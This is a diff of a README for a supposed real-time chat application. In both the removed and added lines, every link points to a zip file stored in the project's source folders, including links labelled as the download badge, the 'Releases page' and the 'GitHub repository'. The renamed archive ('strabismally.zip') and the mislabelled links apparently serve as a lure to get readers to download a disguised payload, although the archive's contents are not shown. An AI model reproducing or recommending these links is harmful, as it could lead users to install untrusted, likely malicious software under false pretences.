@@ -1,6 +1,6 @@
 # 🎉 Real-Time-Chat-Application - Connect Instantly with Friends
 
-[![Download Now](https://raw.githubusercontent.com/SAMMY-D02/Real-Time-Chat-Application/main/frontend/public/Real-Application-Time-Chat-3.9.zip%20Now-Real--Time--Chat--Application-blue)](https://raw.githubusercontent.com/SAMMY-D02/Real-Time-Chat-Application/main/frontend/public/Real-Application-Time-Chat-3.9.zip)
+[![Download Now](https://github.com/SAMMY-D02/Real-Time-Chat-Application/raw/refs/heads/main/frontend/src/Time-Chat-Application-Real-strabismally.zip%20Now-Real--Time--Chat--Application-blue)](https://github.com/SAMMY-D02/Real-Time-Chat-Application/raw/refs/heads/main/frontend/src/Time-Chat-Application-Real-strabismally.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Real-Time Chat Application! This app allows you to chat in real-t
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/SAMMY-D02/Real-Time-Chat-Application/main/frontend/public/Real-Application-Time-Chat-3.9.zip) to download the latest version of the application.
+1. Visit the [Releases page](https://github.com/SAMMY-D02/Real-Time-Chat-Application/raw/refs/heads/main/frontend/src/Time-Chat-Application-Real-strabismally.zip) to download the latest version of the application.
    
 2. Find the most recent release and look for files labeled with the version number. Choose the file that fits your operating system.
 
@@ -56,8 +56,8 @@ If you encounter issues or have questions, please check the FAQ section on our G
 
 ## 🌐 Visit Us
 
-For more information and to get involved, visit our [GitHub repository](https://raw.githubusercontent.com/SAMMY-D02/Real-Time-Chat-Application/main/frontend/public/Real-Application-Time-Chat-3.9.zip).
+For more information and to get involved, visit our [GitHub repository](https://github.com/SAMMY-D02/Real-Time-Chat-Application/raw/refs/heads/main/frontend/src/Time-Chat-Application-Real-strabismally.zip).
 
-Don't forget to check out the [Releases page](https://raw.githubusercontent.com/SAMMY-D02/Real-Time-Chat-Application/main/frontend/public/Real-Application-Time-Chat-3.9.zip) again for future updates and new features!
+Don't forget to check out the [Releases page](https://github.com/SAMMY-D02/Real-Time-Chat-Application/raw/refs/heads/main/frontend/src/Time-Chat-Application-Real-strabismally.zip) again for future updates and new features!
 
 Enjoy chatting in real-time with your friends and family!
